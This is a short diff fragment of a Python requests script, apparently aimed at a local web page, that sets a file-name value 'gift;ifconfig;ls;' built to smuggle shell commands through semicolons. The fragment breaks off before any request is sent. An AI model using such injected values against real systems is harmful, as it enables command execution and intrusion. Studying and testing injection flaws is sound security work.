@@ -1,5 +1,5 @@
 import requests
-inflitration = 'http://127.0.0.1:8000/use.html'
+inflitration = ''
 init_session = requests.Session()
 file = "gift;ifconfig;ls;"
 try: 
